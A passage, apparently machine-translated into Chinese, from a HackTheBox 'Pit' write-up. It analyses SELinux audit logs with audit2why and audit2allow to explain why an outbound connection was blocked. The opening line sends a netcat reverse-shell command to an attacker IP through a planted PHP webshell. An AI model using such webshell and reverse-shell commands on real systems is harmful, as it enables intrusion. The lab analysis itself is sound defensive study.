    oxdf@parrot$ curl -G --data-urlencode 'cmd=nc 10.10.14.7 443' http://dms-pit.htb/seeddms51x/data/1048576/29/1.php
    

它会生成以下日志：

    type=AVC msg=audit(1632504453.554:5282): avc:  denied  { name_connect } for  pid=15554 comm="nc" dest=443 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0
    type=SYSCALL msg=audit(1632504453.554:5282): arch=c000003e syscall=42 success=no exit=-13 a0=3 a1=5635357392c0 a2=10 a3=3 items=0 ppid=15428 pid=15554 auid=4294967295 uid=992 gid=988 euid=992 suid=992 fsuid=992 egid=988 sgid=988 fsgid=988 tty=(none) ses=4294967295 comm="nc" exe="/usr/bin/ncat" subj=system_u:system_r:httpd_t:s0 key=(null)ARCH=x86_64 SYSCALL=connect AU U G EU SU FSU EG SG FSG
    type=PROCTITLE msg=audit(1632504453.554:5282): proctitle=6E630031302E31302E31342E3700343433
    

我可以将其输入以获取有关正在发生的事情的更多详细信息：`audit2why`

    [root@pit audit]# cat audit.log | grep 'comm="nc"' | tail -2 | audit2why
    type=AVC msg=audit(1632504453.554:5282): avc:  denied  { name_connect } for  pid=15554 comm="nc" dest=443 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0
    
            Was caused by:
            One of the following booleans was set incorrectly.
            Description:
            Allow httpd to can network connect
    
            Allow access by executing:
            # setsebool -P httpd_can_network_connect 1
            Description:
            Allow httpd to graceful shutdown
    
            Allow access by executing:
            # setsebool -P httpd_graceful_shutdown 1
            Description:
            Allow httpd to can network relay
    
            Allow access by executing:
            # setsebool -P httpd_can_network_relay 1
            Description:
            Allow nis to enabled
    
            Allow access by executing:
            # setsebool -P nis_enabled 1
    

这些消息假设如果您正在查找，它应该正在工作（而不是检测恶意活动）。尽管如此，细节还是有用的。有一条规则阻止进程建立出站连接。`httpd`

`Z`in 将显示相同的进程：`ps`

    [root@pit audit]# ps auxwwZ | grep nginx
    system_u:system_r:httpd_t:s0    root        1139  0.0  0.0 119280  2284 ?        Ss   Sep23   0:00 nginx: master process /usr/sbin/nginx
    system_u:system_r:httpd_t:s0    nginx       1145  0.0  0.2 151984  8180 ?        S    Sep23   0:00 nginx: worker process
    system_u:system_r:httpd_t:s0    nginx       1146  0.0  0.2 151984  8180 ?        S    Sep23   0:00 nginx: worker process
    system_u:system_r:httpd_t:s0    nginx      15837  0.0  0.3 266780 12972 ?        S    13:35   0:00 php-fpm: pool www
    system_u:system_r:httpd_t:s0    nginx      15838  0.0  0.3 266780 12976 ?        S    13:35   0:00 php-fpm: pool www
    system_u:system_r:httpd_t:s0    nginx      15839  0.0  0.3 266780 12976 ?        S    13:35   0:00 php-fpm: pool www
    system_u:system_r:httpd_t:s0    nginx      15840  0.0  0.3 266780 12976 ?        S    13:35   0:00 php-fpm: pool www
    system_u:system_r:httpd_t:s0    nginx      15841  0.0  0.3 266780 12976 ?        S    13:35   0:00 php-fpm: pool www
    

`nginx`在角色中。 显示此角色需要一些权限才能连接。`httpd_t``audit2why`

### 审核2允许

`audit2allow`将为您提供被阻止的事物的列表，以及允许的内容，以便它们都不会被阻止。简而言之，如果您将SeLinux安装在干净的系统上，将其置于许可模式，运行一小段时间，然后允许所有内容，只要您的系统在那段时间内没有被利用，您就可以很好地了解您所做的合法操作。

对于疑似受感染的主机，您可以使用它来查看 SeLinux 阻止的所有内容：

    [root@pit monitoring]# audit2allow -i /var/log/audit/audit.log
    
    
    #============= httpd_t ==============
    
    #!!!! This avc can be allowed using one of the these booleans:
    #     httpd_can_network_connect, httpd_graceful_shutdown, httpd_can_network_relay, nis_enabled
    allow httpd_t http_port_t:tcp_socket name_connect;
    
    #============= setroubleshootd_t ==============
    allow setroubleshootd_t user_t:dbus send_msg;
    
    #============= snmpd_t ==============
    allow snmpd_t admin_home_t:file { getattr open read };
    
    #============= user_t ==============
    allow user_t init_var_run_t:service status;
    allow user_t self:capability sys_resource;
    allow user_t setroubleshoot_fixit_t:dbus send_msg;
    allow user_t setroubleshootd_t:dbus send_msg;
    allow user_t tuned_t:dbus send_msg;
    allow user_t usr_t:dir remove_name;
    

因此，它正在检测尝试建立连接，尝试读取文件等。`httpd_t``snmpd_t`

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2021/09/25/htb-pit.html)